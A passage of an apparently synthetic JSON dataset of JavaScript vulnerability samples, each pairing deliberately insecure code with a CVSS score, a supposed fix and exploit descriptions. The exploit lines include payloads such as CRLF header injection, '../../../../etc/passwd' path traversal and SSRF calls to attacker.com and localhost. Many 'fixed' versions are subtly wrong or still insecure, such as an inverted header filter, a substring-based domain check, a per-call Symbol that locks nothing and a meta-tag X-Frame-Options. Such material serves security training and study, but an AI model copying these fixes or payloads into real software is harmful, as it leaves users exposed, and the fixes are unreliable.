        "vulnerability_code": "class WebApp {\\n    constructor() {\\n        this.headers = {};\\n    }\\n\\n    setHeader(name, value) {\\n        if (name.toLowerCase() !== 'content-security-policy') {\\n            this.headers[name] = value;\\n        }\\n    }\\n}",
        "cvss_score": 4.3,
        "fixed_code": "class WebApp {\\n    constructor() {\\n        this.headers = {};\\n    }\\n\\n    setHeader(name, value) {\\n        const requiredHeaders = ['content-security-policy', 'x-frame-options', 'x-content-type-options'];\\n        if (requiredHeaders.includes(name.toLowerCase())) {\\n            this.headers[name] = value;\\n        } else {\\n            console.warn(`Setting non-required header: ${name}`);\\n        }\\n    }\\n}",
        "exploit_ways": [
            "An attacker can inject arbitrary headers, leading to clickjacking attacks if X-Frame-Options is not set.",
            "Without Content-Security-Policy (CSP), the application may be vulnerable to cross-site scripting (XSS) attacks.",
            "The absence of X-Content-Type-Options: nosniff header makes the application susceptible to MIME type sniffing vulnerabilities."
        ]
    },
    "javascript_31": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "function updateBalance(account, amount) {\n    setTimeout(function() {\n        account.balance += amount;\n        console.log('Updated balance:', account.balance);\n    }, 100);\n}",
        "cvss_score": 5.3,
        "fixed_code": "function updateBalance(account, amount) {\n    return new Promise((resolve) => {\n        setTimeout(() => {\n            account.balance += amount;\n            console.log('Updated balance:', account.balance);\n            resolve();\n        }, 100);\n    });\n}",
        "exploit_ways": [
            "An attacker could exploit the race condition to perform multiple updates in a short time, leading to an incorrect final balance.",
            "By manipulating timing, an attacker might be able to cause transactions to overwrite each other's results.",
            "In some cases, the delay could lead to security checks being bypassed if they rely on the immediate state of account.balance."
        ]
    },
    "javascript_32": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "class UserProfile {\n    constructor(name, email) {\n        this.name = name;\n        this.email = email;\n        this.secretInfo = \"This is a secret.\";\n    }\n\n    getSecretInfo() {\n        return this.secretInfo;\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "class UserProfile {\n    constructor(name, email) {\n        this.name = name;\n        this.email = email;\n        const secretInfo = \"This is a secret.\";\n\n        this.getSecretInfo = function() {\n            // Assuming proper authorization before returning\n            if (this.isAuthorized()) {\n                return secretInfo;\n            }\n            throw new Error(\"Unauthorized access\");\n        };\n    }\n\n    isAuthorized() {\n        // Placeholder for actual authorization logic\n        return false;\n    }\n}",
        "exploit_ways": [
            "An attacker can call getSecretInfo to obtain sensitive information if not properly restricted.",
            "By accessing the instance, unauthorized users might directly read secretInfo if no encapsulation is applied.",
            "If part of a larger system, the secret information could be leaked via API endpoints that improperly expose this data."
        ]
    },
    "javascript_33": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "class ClickjackFrame {\n    constructor(url) {\n        this.frame = document.createElement('iframe');\n        this.frame.src = url;\n        this.frame.style.position = 'absolute';\n        this.frame.style.top = '0';\n        this.frame.style.left = '0';\n        this.frame.style.width = '100%';\n        this.frame.style.height = '100%';\n        this.frame.style.border = 'none';\n        document.body.appendChild(this.frame);\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "class ClickjackFrame {\n    constructor(url) {\n        this.frame = document.createElement('iframe');\n        this.frame.src = url;\n        this.frame.style.position = 'absolute';\n        this.frame.style.top = '0';\n        this.frame.style.left = '0';\n        this.frame.style.width = '100%';\n        this.frame.style.height = '100%';\n        this.frame.style.border = 'none';\n        this.frame.sandbox = '';\n        document.body.appendChild(this.frame);\n    }\n}",
        "exploit_ways": [
            "An attacker can overlay a transparent iframe over legitimate content to capture clicks.",
            "Users may unknowingly interact with the malicious iframe, potentially leading to unintended actions.",
            "The vulnerability allows attackers to trick users into clicking buttons on behalf of them."
        ]
    },
    "javascript_34": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "class InfiniteLoop {\n    constructor() {}\n    start() {\n        while(true) {}\n    }\n}",
        "cvss_score": 3.0,
        "fixed_code": "class LimitedLoop {\n    constructor(maxIterations = 1000) {\n        this.maxIterations = maxIterations;\n    }\n    start() {\n        for (let i = 0; i < this.maxIterations; i++) {}\n    }\n}",
        "exploit_ways": [
            "An attacker can instantiate the InfiniteLoop class and call start(), causing the server to hang indefinitely.",
            "If running in a web environment, this could lead to resource exhaustion, making the application unresponsive.",
            "In some environments, continuous execution could lead to increased CPU usage, affecting performance."
        ]
    },
    "javascript_35": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "function sendUserFeedback(feedback) {\n    var xhr = new XMLHttpRequest();\n    xhr.open('POST', '/submit_feedback.php', true);\n    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n    xhr.send('user=' + encodeURIComponent(feedback));\n}",
        "cvss_score": 6.1,
        "fixed_code": "function sendUserFeedback(feedback) {\n    var xhr = new XMLHttpRequest();\n    xhr.open('POST', '/submit_feedback.php', true);\n    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n    // Sanitize feedback to prevent HTTP response splitting\n    var sanitizedFeedback = feedback.replace(/\\r|\\n/g, '');\n    xhr.send('user=' + encodeURIComponent(sanitizedFeedback));\n}",
        "exploit_ways": [
            "An attacker could inject '\\r\\nSet-Cookie: admin=true' to manipulate cookies.",
            "By inserting '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>Malicious Content</body></html>' the server might send unintended responses.",
            "Injecting '\\r\\nLocation: http://attacker.com' could redirect users to a malicious site."
        ]
    },
    "javascript_36": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nconst sensitiveData = {\n    secretKey: '12345',\n    userCredentials: {\n        username: 'admin',\n        password: 'password'\n    }\n};\n\napp.get('/info', (req, res) => {\n    try {\n        const key = req.query.key;\n        if (!key) throw new Error('Key is required');\n        const value = sensitiveData[key];\n        if (value === undefined) throw new Error('Invalid key');\n        res.json({ [key]: value });\n    } catch (error) {\n        res.status(400).json({ error: error.message });\n    }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));",
        "cvss_score": 2.5,
        "fixed_code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nconst sensitiveData = {\n    secretKey: '12345',\n    userCredentials: {\n        username: 'admin',\n        password: 'password'\n    }\n};\n\nconst allowedKeys = ['secretKey'];\n\napp.get('/info', (req, res) => {\n    try {\n        const key = req.query.key;\n        if (!key || !allowedKeys.includes(key)) throw new Error('Invalid or unauthorized key');\n        res.json({ [key]: sensitiveData[key] });\n    } catch (error) {\n        res.status(400).json({ error: error.message });\n    }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));",
        "exploit_ways": [
            "An attacker can request /info?key=secretKey to retrieve the secret key.",
            "They could try /info?key=userCredentials to access username and password if not properly restricted.",
            "Exploiting this, an attacker might infer internal structure by trying different keys."
        ]
    },
    "javascript_37": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "class DataFetcher {\\n    constructor(url) {\\n        this.url = url;\\n    }\\n\\n    fetch() {\\n        const xhr = new XMLHttpRequest();\\n        xhr.open('GET', 'https:\\/\\/api.example.com\\/data?' + this.url.split('=')[1], true);\\n        xhr.send();\\n    }\\n}",
        "cvss_score": 5.3,
        "fixed_code": "class DataFetcher {\\n    constructor(url) {\\n        const allowedDomain = 'https://api.example.com';\\n        if (!url.startsWith(allowedDomain)) {\\n            throw new Error('Invalid URL');\\n        }\\n        this.url = url;\\n    }\\n\\n    fetch() {\\n        const xhr = new XMLHttpRequest();\\n        xhr.open('GET', this.url, true);\\n        xhr.send();\\n    }\\n}",
        "exploit_ways": [
            "An attacker could modify the URL to point to an internal network resource like 'https://internal-api.example.com/data'.",
            "The attacker might use the vulnerability to request sensitive data from other domains if they can control the input parameter.",
            "By injecting a malicious URL, attackers could attempt to perform actions on behalf of the server, such as downloading files or sending requests to external servers."
        ]
    },
    "javascript_38": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "class URLHandler {\n    constructor(url) {\n        this.url = url;\n    }\n\n    redirect() {\n        window.location.href = this.url;\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "class URLHandler {\n    constructor(url) {\n        const allowedDomains = ['example.com', 'sub.example.com'];\n        if (allowedDomains.some(domain => url.includes(domain))) {\n            this.url = url;\n        } else {\n            throw new Error('Invalid URL');\n        }\n    }\n\n    redirect() {\n        window.location.href = this.url;\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL like 'http://malicious.com' to redirect users to an unauthorized site.",
            "By appending URLs, attackers could craft a link that redirects users to phishing sites or malware downloads, e.g., 'https://legitimate.com/redirect?url=http%3A%2F%2Fphishing.com'.",
            "Malicious actors can use the vulnerability to redirect users from secure HTTPS pages to insecure HTTP pages, compromising data security."
        ]
    },
    "javascript_39": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "class DataFetcher {\n    constructor(url) {\n        this.url = url;\n    }\n\n    fetchData(path) {\n        const fullUrl = new URL(path, this.url);\n        fetch(fullUrl).then(response => response.text()).then(data => console.log(data));\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "class DataFetcher {\n    constructor(baseURL) {\n        this.baseURL = new URL(baseURL);\n    }\n\n    fetchData(path) {\n        const allowedHost = this.baseURL.hostname;\n        const fullUrl = new URL(path, this.baseURL);\n        if (fullUrl.hostname !== allowedHost) {\n            throw new Error('Invalid host');\n        }\n        fetch(fullUrl).then(response => response.text()).then(data => console.log(data));\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a path like 'http://attacker.com/malicious-data' to exfiltrate internal data.",
            "They could use a relative URL to access internal resources not meant for public consumption, such as '/admin/config'.",
            "Crafting a URL with port numbers targeting internal services like 'http://localhost:8080/secret.txt' can lead to sensitive information disclosure."
        ]
    },
    "javascript_40": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Clickjacking Example</title>\n    <style>\n        #overlay {\n            position: absolute;\n            top: 5px;\n            left: 5px;\n            width: 200px;\n            height: 200px;\n            opacity: 0.3;\n            z-index: 1000;\n        }\n    </style>\n</head>\n<body>\n    <button id=\"visibleButton\" onclick=\"alert('You clicked the visible button!');\">Click Me!</button>\n    <div id=\"overlay\">\n        <iframe src=\"https://example.com/hidden-clickable-area\" width=\"200\" height=\"200\" frameborder=\"0\"></iframe>\n    </div>\n</body>\n</html>",
        "cvss_score": 3.5,
        "fixed_code": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Clickjacking Example</title>\n    <style>\n        #overlay {\n            position: absolute;\n            top: 5px;\n            left: 5px;\n            width: 200px;\n            height: 200px;\n            opacity: 0.3;\n            z-index: 1000;\n        }\n    </style>\n    <script>\n        document.addEventListener('click', function(event) {\n            if (event.target.id === 'visibleButton') {\n                alert('You clicked the visible button!');\n            }\n        });\n    </script>\n</head>\n<body>\n    <button id=\"visibleButton\">Click Me!</button>\n</body>\n</html>",
        "exploit_ways": [
            "An attacker could place a hidden iframe over the visible button to redirect clicks to another action.",
            "Users clicking the visible button could inadvertently trigger actions on the hidden iframe, like unintended purchases or data submissions.",
            "The overlay can be styled to cover critical buttons on legitimate websites, leading to unauthorized actions."
        ]
    },
    "javascript_41": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "function safeRedirect(url) {\n    const allowedDomains = [\"example.com\", \"safe.example.org\"];\n    const parsedUrl = new URL(url);\n    if (allowedDomains.includes(parsedUrl.hostname)) {\n        window.location.href = url;\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "function safeRedirect(url) {\n    const allowedDomains = [\"example.com\", \"safe.example.org\"];\n    const parsedUrl = new URL(url);\n    if (allowedDomains.includes(parsedUrl.hostname)) {\n        window.location.href = encodeURIComponent(url);\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL with an allowed domain to redirect users to phishing sites.",
            "Attackers could craft URLs that include additional parameters or query strings to manipulate the redirection process.",
            "Users can be redirected to download malware if they follow a crafted link targeting an allowed domain."
        ]
    },
    "javascript_42": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "\"use strict\";\n\nconst fs = require('fs');\nconst express = require('express');\nconst app = express();\n\napp.get('/file', (req, res) => {\n    const filePath = req.query.file || 'default.txt';\n    fs.readFile(filePath, 'utf8', (err, data) => {\n        if (err) {\n            return res.status(500).send('Error reading file');\n        }\n        res.send(data);\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server running on http://localhost:3000/');\n});",
        "cvss_score": 5.4,
        "fixed_code": "\"use strict\";\n\nconst fs = require('fs');\nconst express = require('express');\nconst path = require('path');\nconst app = express();\n\napp.get('/file', (req, res) => {\n    const safePath = path.join(__dirname, 'files', req.query.file || 'default.txt');\n    if (!safePath.startsWith(path.resolve(__dirname + '/files'))) {\n        return res.status(403).send('Forbidden');\n    }\n    fs.readFile(safePath, 'utf8', (err, data) => {\n        if (err) {\n            return res.status(500).send('Error reading file');\n        }\n        res.send(data);\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server running on http://localhost:3000/');\n});",
        "exploit_ways": [
            "An attacker could request /file?file=../../../../etc/passwd to read the system's password file.",
            "They might attempt to fetch sensitive server-side files by manipulating the 'file' parameter with path traversal techniques.",
            "By exploiting LFI, an attacker can potentially access any readable file on the server within the same filesystem."
        ]
    },
    "javascript_43": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "function infiniteLoop() { while(true) {} } infiniteLoop();",
        "cvss_score": 4.2,
        "fixed_code": "function limitedLoop() { for(let i = 0; i < 1000; i++) {} } limitedLoop();",
        "exploit_ways": [
            "An attacker can call the infiniteLoop function to freeze the application indefinitely.",
            "If this code runs on a server, it could exhaust CPU resources leading to DoS for other users.",
            "In web contexts, this can make the page unresponsive, preventing user interaction."
        ]
    },
    "javascript_44": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "class InfiniteLoop {\n    start() {\n        while (true) {}\n    }\n}",
        "cvss_score": 3.0,
        "fixed_code": "class LimitedLoop {\n    start(limit) {\n        for (let i = 0; i < limit; i++) {}\n    }\n}",
        "exploit_ways": [
            "An attacker can call the start method to freeze the application indefinitely.",
            "If integrated into a server, this can cause denial of service by blocking other operations.",
            "Could be used in testing environments to intentionally halt execution for debugging."
        ]
    },
    "javascript_45": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "function sendUserFeedback(feedback) {\n    const xhr = new XMLHttpRequest();\n    xhr.open(\"POST\", \"/submit_feedback\", true);\n    xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n    xhr.send(\"user_feedback=\" + feedback);\n}",
        "cvss_score": 6.1,
        "fixed_code": "function sendUserFeedback(feedback) {\n    const xhr = new XMLHttpRequest();\n    xhr.open(\"POST\", \"/submit_feedback\", true);\n    xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n    xhr.send(\"user_feedback=\" + encodeURIComponent(feedback));\n}",
        "exploit_ways": [
            "An attacker can inject CRLF sequences (\\r\\n) to manipulate HTTP headers or responses.",
            "Could use the injection to perform cache poisoning attacks on intermediate caches.",
            "Inject JavaScript code via specially crafted feedback to perform XSS if other parts of the application are vulnerable."
        ]
    },
    "javascript_46": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "function updateBalance(newBalance) {\n    setTimeout(() => {\n        this.balance = newBalance;\n    }, 100);\n}",
        "cvss_score": 6.5,
        "fixed_code": "function updateBalance(newBalance) {\n    const lock = Symbol('lock');\n    if (!this[lock]) {\n        this[lock] = true;\n        setTimeout(() => {\n            this.balance = newBalance;\n            delete this[lock];\n        }, 100);\n    }\n}",
        "exploit_ways": [
            "An attacker could repeatedly call updateBalance in quick succession to cause inconsistent state.",
            "By timing the calls precisely, an attacker might prevent a critical balance check from occurring correctly.",
            "In a multi-user environment, race conditions can lead to incorrect balance calculations or unauthorized transactions."
        ]
    },
    "javascript_47": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Clickjacking Example</title>\n    <style>\n        #overlay {\n            position: absolute;\n            top: 50px;\n            left: 50px;\n            width: 200px;\n            height: 100px;\n            opacity: 0.3;\n            z-index: 2;\n        }\n    </style>\n</head>\n<body>\n    <div id=\"overlay\"><a href=\"http://malicious.com\"></a></div>\n    <iframe src=\"https://legitimate-website.com\" width=\"400px\" height=\"300px\"></iframe>\n</body>\n</html>",
        "cvss_score": 3.8,
        "fixed_code": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Clickjacking Example</title>\n    <style>\n        #overlay {\n            position: absolute;\n            top: 50px;\n            left: 50px;\n            width: 200px;\n            height: 100px;\n            opacity: 0.3;\n            z-index: 2;\n        }\n    </style>\n    <meta http-equiv=\"X-Frame-Options\" content=\"SAMEORIGIN\">\n</head>\n<body>\n    <div id=\"overlay\"><a href=\"http://malicious.com\"></a></div>\n    <iframe src=\"https://legitimate-website.com\" width=\"400px\" height=\"300px\"></iframe>\n</body>\n</html>",
        "exploit_ways": [
            "An attacker can trick users into clicking the overlay, which redirects them to a malicious site.",
            "The iframe could be used to perform actions on behalf of the user without their knowledge.",
            "Attackers might hide the legitimate content behind the overlay, leading to unintentional interactions with malicious elements."
        ]
    },
    "javascript_48": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "function updateBalance(newAmount) {\n    setTimeout(() => {\n        let currentBalance = getBalance();\n        setBalance(currentBalance + newAmount);\n    }, 1000);\n}",
        "cvss_score": 5.3,
        "fixed_code": "function updateBalance(newAmount) {\n    const balancePromise = getBalanceAsync();\n    balancePromise.then(currentBalance => {\n        setBalance(currentBalance + newAmount);\n    });\n}\n\nfunction getBalanceAsync() {\n    return new Promise((resolve, reject) => {\n        setTimeout(() => {\n            resolve(getBalance());\n        }, 1000);\n    });\n}",
        "exploit_ways": [
            "An attacker could manipulate the timing of multiple transactions to exploit inconsistent balance updates.",
            "By initiating simultaneous balance updates, an attacker might cause incorrect calculations leading to unauthorized gains or losses.",
            "Using precise timing attacks, an attacker could potentially reset balances by overlapping update operations."
        ]
    },
    "javascript_49": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "const fs = require('fs');\nfunction readFileContent(filePath) {\n    const safePath = \"/safe/directory/\" + encodeURIComponent(filePath.split('/').pop());\n    fs.readFile(safePath, 'utf8', (err, data) => {\n        if (err) throw err;\n        console.log(data);\n    });\n}",
        "cvss_score": 5.0,
        "fixed_code": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFileContent(filePath) {\n    const baseDirectory = \"/safe/directory/\";\n    const safePath = path.join(baseDirectory, path.basename(filePath));\n    if (safePath.startsWith(baseDirectory)) {\n        fs.readFile(safePath, 'utf8', (err, data) => {\n            if (err) throw err;\n            console.log(data);\n        });\n    } else {\n        throw new Error('Invalid file path');\n    }\n}",
        "exploit_ways": [
            "An attacker could attempt to traverse directories using '..' in the filePath input to access files outside /safe/directory/.",
            "If not properly sanitized, special characters or encoded sequences can be used to manipulate the filePath parameter to read unauthorized files.",
            "Exploiting symlink vulnerabilities if symlinks point to sensitive files within the restricted directory."
        ]
    }
}